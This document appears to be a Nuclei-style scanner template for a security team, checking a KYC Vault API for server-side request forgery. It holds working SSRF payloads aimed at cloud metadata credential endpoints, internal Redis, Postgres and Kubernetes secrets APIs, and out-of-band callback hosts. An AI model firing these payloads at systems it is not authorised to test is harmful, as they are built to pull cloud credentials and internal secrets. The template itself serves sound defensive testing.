@@ -1,0 +1,121 @@
+id: kyc-ssrf-check
+
+info:
+  name: KYC Vault SSRF Vulnerability Check
+  author: security-team
+  severity: critical
+  description: |
+    Server-Side Request Forgery detection for KYC Vault API endpoints.
+    Tests internal metadata endpoints, cloud provider instance metadata,
+    and internal service discovery endpoints.
+  classification:
+    cwe-id: CWE-918
+  tags: kyc, ssrf, oob, internal
+
+requests:
+  # ── Metadata / cloud provider endpoints ──────────────────
+  - method: GET
+    path:
+      - "{{BaseURL}}/v1/did/resolve/http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/v1/did/resolve/http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+      - "{{BaseURL}}/v1/did/resolve/http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/v1/credentials/resolve?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "{{BaseURL}}/v1/compliance/screen?callback=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/v1/zkp/verify?proofUrl=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/api/v1/credentials/import?source=http://169.254.169.254/latest/user-data"
+    headers:
+      Metadata-Flavor: "Google"
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "public-keys"
+          - "security-credentials"
+          - "iam/"
+          - "roleName"
+          - "accessKeyId"
+          - "secretAccessKey"
+          - "token"
+          - "expiration"
+          - "projectId"
+          - "numericProjectId"
+        condition: or
+      - type: status
+        status:
+          - 200
+
+  # ── Internal service discovery ───────────────────────────
+  - method: GET
+    path:
+      - "{{BaseURL}}/v1/did/resolve/http://localhost:8080/healthz"
+      - "{{BaseURL}}/v1/did/resolve/http://localhost:9001/metrics"
+      - "{{BaseURL}}/v1/did/resolve/http://localhost:6379/"
+      - "{{BaseURL}}/v1/did/resolve/http://localhost:5432/"
+      - "{{BaseURL}}/v1/credentials/resolve?url=http://127.0.0.1:9092/"
+      - "{{BaseURL}}/v1/compliance/screen?callback=http://127.0.0.1:6443/apis"
+      - "{{BaseURL}}/v1/zkp/verify?proofUrl=http://10.42.0.1:10250/run"
+      - "{{BaseURL}}/v1/did/resolve/http://kubernetes.default.svc/api/v1/namespaces/default/secrets"
+      - "{{BaseURL}}/v1/did/resolve/http://kyc-vault-redis:6379/info"
+      - "{{BaseURL}}/v1/did/resolve/http://kyc-vault-db:5432/"
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "ok"
+          - "healthy"
+          - "redis_version"
+          - "PostgreSQL"
+          - "Kafka"
+          - "apiVersion"
+          - "kind"
+          - "List"
+          - "items"
+          - "secrets"
+          - "Namespace"
+          - "prometheus"
+          - "go_gc"
+          - "process_cpu"
+        condition: or
+      - type: status
+        status:
+          - 200
+          - 101
+
+  # ── Blind / OOB SSRF via HTTP callback ───────────────────
+  - method: POST
+    path:
+      - "{{BaseURL}}/v1/credentials"
+      - "{{BaseURL}}/v1/compliance/screen"
+      - "{{BaseURL}}/v1/zkp/prove"
+      - "{{BaseURL}}/v1/zkp/verify"
+      - "{{BaseURL}}/v1/did/resolve"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "callbackUrl": "http://oob.{{interactsh-url}}/ssrf-test",
+        "webhookUrl": "http://oob.{{interactsh-url}}/ssrf-test",
+        "proofUrl": "http://oob.{{interactsh-url}}/ssrf-test",
+        "source": "http://oob.{{interactsh-url}}/ssrf-test",
+        "url": "http://oob.{{interactsh-url}}/ssrf-test"
+      }
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+
+  # ── DNS-based SSRF check ─────────────────────────────────
+  - method: GET
+    path:
+      - "{{BaseURL}}/v1/did/resolve/http://oob.{{interactsh-url}}/"
+      - "{{BaseURL}}/v1/credentials/fetch?url=http://oob.{{interactsh-url}}/"
+      - "{{BaseURL}}/v1/compliance/screen?callback=http://oob.{{interactsh-url}}/"
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
